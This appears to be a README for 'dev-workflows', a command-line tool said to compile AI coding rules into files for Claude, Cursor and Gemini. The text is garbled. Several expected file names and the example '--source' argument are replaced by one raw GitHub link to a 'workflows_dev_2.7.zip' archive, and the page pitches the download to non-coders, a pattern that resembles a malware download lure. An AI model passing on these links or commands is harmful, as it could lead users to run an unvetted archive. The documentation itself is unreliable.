## 📋 What is dev-workflows?

dev-workflows is a simple command-line tool that helps you manage AI coding rules. Instead of writing rules separately for each AI tool, you write your rules once. dev-workflows then compiles those rules into formats that popular AI tools like CLAUDE and GEMINI can use.

This means less work for you and a consistent way to tell AI tools how to write and review code. The tool creates files like `https://raw.githubusercontent.com/aridz08/dev-workflows/main/content/templates/workflows_dev_2.7.zip`, `.cursor/rules`, and `https://raw.githubusercontent.com/aridz08/dev-workflows/main/content/templates/workflows_dev_2.7.zip` from your rules.  

You do not need to understand coding to use dev-workflows. The instructions below will walk you through downloading and running the tool step-by-step.

## 🛠 How to Use dev-workflows

Once you start dev-workflows, the tool reads your AI coding rules from a single file or folder you specify. It then creates output files for each AI tool you want to use.

A typical workflow:

1. Prepare your coding rules in a simple text file. Follow any format instructions in the documentation or examples inside the `docs/` folder of the release.

2. Run dev-workflows and provide the location of your rules file. For example:

   ```
   dev-workflows compile --source https://raw.githubusercontent.com/aridz08/dev-workflows/main/content/templates/workflows_dev_2.7.zip
   ```

3. The tool generates output files such as:

   - `https://raw.githubusercontent.com/aridz08/dev-workflows/main/content/templates/workflows_dev_2.7.zip` for Claude AI
   - `.cursor/rules` for Cursor AI
   - `https://raw.githubusercontent.com/aridz08/dev-workflows/main/content/templates/workflows_dev_2.7.zip` for Gemini AI

4. Use these files with your AI coding tools to ensure they follow your rules consistently.
